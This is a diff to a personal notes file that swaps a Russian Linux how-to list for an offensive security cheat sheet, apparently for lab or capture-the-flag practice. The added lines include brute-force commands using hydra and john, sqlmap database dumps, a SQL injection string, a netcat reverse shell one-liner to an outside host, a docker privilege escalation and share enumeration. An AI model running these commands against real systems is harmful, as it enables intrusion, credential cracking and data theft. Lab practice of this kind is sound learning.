@@ -1,46 +1,79 @@
-# manual
+nmap -sC -sV 10.10.105.34
+nmap --script vuln ip -vv
+# no ICMP
+nmap -Pn ip
 
-#### Конфиг vim
-`/usr/share/vim/vimrc`
+# generates hash for /etc/passwd(user should already exist)
+openssl passwd -1
 
-#### Nmap Сканирование всех ip адресов в локальной сети
-`nmap -v -sP 192.168.1.3/24`
+# for /etc/shadow
+mkpasswd -m sha-512 password 
 
-#### Wine установка доп. компонентов в бутылку
-`WINEARCH=win32 WINEPREFIX=~/win32 winetricks -q msxml3 dotnet40 corefonts`
+snap run john-the-ripper --wordlist=~/rockyou.txt hash
+# gpg2john
+/snap/bin/john-the-ripper.gpg2john
 
-#### Копирование всех файло кроме одного
-`ls folder1 | grep -v file1 | xargs cp folder2 (folder1 - Исходная, folder2 - конечная, file1 - игнорируемый файл)`
+awk 'length($0)==10' rockyou.txt
 
-#### Замена подстроки в vim
-`:{пределы}s/{что заменяем}/{на что заменяем}/{опции}`
-`:%s/float(dmg)/dmg`
+# blank password
+steghide extract -sf
 
-#### Распаковка архива tar.gz
-`tar -xvf /path/to/archive.tar.gz -C /pathToUnpack`
+hydra -l <username> -P <path to wordlist> <IP> ssh
+hydra -l molly -P rockyou.txt 10.10.57.111 http-post-form "/login:username=molly&password=^PASS^:incorrect" -V
 
-#### Просмотр прав на файл
-`ls -l file`
+./zip2john 8702.zip > hash  # To bruteforce zip file with password, after that run this hash with john the ripper
 
-#### Вывод надписи на экран(bash скрипт)
-`notify-send "Your text here"`
+stegcracker cute-alien.jpg ~/rockyou.txt
 
-#### Подключение по ssh с использованием графического интерфейса
-`ssh -X user@host`
+# ssh priv key to hash
+ssh2john.py id_rsa
 
-#### Настройка git
-	git config --global user.name "John Doe
-	git config --global user.email johndoe@example.com
 
-#### Смена ip
-`sudo ifconfig wlp3s0 192.168.0.32 netmask 255.255.255.0`
+# Reminder
+nikto
 
-#### Базовая установка и настройка веб-сервера
-[http://help.ubuntu.ru/wiki/web-server](http://help.ubuntu.ru/wiki/web-server)
+wfuzz -c -z file,dates.list -d "date=FUZZ" -u http://10.10.181.57/site-log.php --hc 404
 
-#### Обновление flash в chrome
-	sudo apt-get install pepperflashplugin-nonfree
-	sudo update-pepperflashplugin-nonfree --install
+sshpass -p !4u2tryhack ssh username@host.example.com
 
-#### Решение проблемы с пропаданием звука в vlc
-`http://forum.ubuntu.ru/index.php?topic=209711.0`
+cewl  # Words on web page
+
+sqlmap -r req.txt -p blood_group -D blood --dump-all
+sqlmap -r burp.txt --tamper=space2comment --dump-all --dbms sqlite
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.125 4444 >/tmp/f
+
+# Stabilize shell
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+//CTRL + Z to background
+stty raw -echo;fg   
+
+# If docker in groups (may help may not)
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# Disclose subdomains
+dig axfr hipflasks.thm @10.10.113.230
+
+# Mount samba share under username
+sudo mount -t cifs -o username=ubuntu //10.10.7.87/sambashare /media/samba
+
+' OR '1'='1' --
+
+# NFS
+showmount --exports 10.10.41.139
+mount 10.10.41.139:/opt/conf /media/nfs
+
+rsync --list-only rsync://rsync-connect@10.10.41.139
+
+gpg --import key.asc
+gpg --decrypt file.pgp
+
+smbclient -NL 10.10.215.0
+smbclient -N //10.10.215.0/VulnNet-Enterprise-Anonymous
+
+# receive
+nc -q 1 -l -p 7777 > runme
+
+# send
+nc -q 1 10.9.3.125 7777 < /home/catlover/runme
